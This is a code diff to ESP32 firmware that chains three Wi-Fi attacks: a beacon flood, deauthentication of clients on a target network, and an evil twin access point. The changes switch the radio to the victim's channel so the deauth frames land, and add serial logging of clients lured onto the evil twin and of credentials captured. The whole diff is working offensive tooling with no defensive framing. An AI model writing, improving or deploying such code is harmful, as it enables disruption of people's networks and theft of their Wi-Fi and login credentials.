@@ -6,6 +6,8 @@
 #include "api_server.h"
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
+#include <esp_wifi.h>
+#include <WiFi.h>
 #include <Arduino.h>
 #include <string.h>
 
@@ -25,10 +27,13 @@ static void transition_to(EstadoCadena next) {
 }
 
 static void chain_task(void* pvParam) {
+    unsigned long t;
+    unsigned long last_log3 = 0;
+
     // FASE_1: Beacon Flood
     transition_to(EstadoCadena::FASE_1_BEACON);
     beacon_flood_task_start();
-    unsigned long t = millis();
+    t = millis();
     while (g_chain_state.ataque_activo &&
            (millis() - t) < (unsigned long)(g_config.duracion_beacon * 1000UL)) {
         vTaskDelay(pdMS_TO_TICKS(100));
@@ -36,7 +41,8 @@ static void chain_task(void* pvParam) {
     beacon_flood_task_stop();
     if (!g_chain_state.ataque_activo) goto done;
 
-    // FASE_2: Deauth
+    // FASE_2: Deauth — switch to target channel so frames reach the victim's network
+    esp_wifi_set_channel(g_config.canal, WIFI_SECOND_CHAN_NONE);
     transition_to(EstadoCadena::FASE_2_DEAUTH);
     deauth_task_start();
     t = millis();
@@ -45,14 +51,23 @@ static void chain_task(void* pvParam) {
         vTaskDelay(pdMS_TO_TICKS(100));
     }
     deauth_task_stop();
+    esp_wifi_set_channel(WARDEN_CONTROL_CHANNEL, WIFI_SECOND_CHAN_NONE);
     if (!g_chain_state.ataque_activo) goto done;
 
     // FASE_3: Evil Twin
     transition_to(EstadoCadena::FASE_3_EVIL);
     evil_twin_start();
     t = millis();
+    last_log3 = 0;
     while (g_chain_state.ataque_activo &&
            (millis() - t) < (unsigned long)(g_config.duracion_evil_twin * 1000UL)) {
+        g_chain_state.clientes_evil_twin = WiFi.softAPgetStationNum();
+        if (millis() - last_log3 >= 1000) {
+            Serial.printf("[FASE_3] clientes_asociados=%d creds=%d\n",
+                          (int)g_chain_state.clientes_evil_twin,
+                          (int)g_chain_state.credenciales_capturadas);
+            last_log3 = millis();
+        }
         vTaskDelay(pdMS_TO_TICKS(100));
     }
     evil_twin_stop();
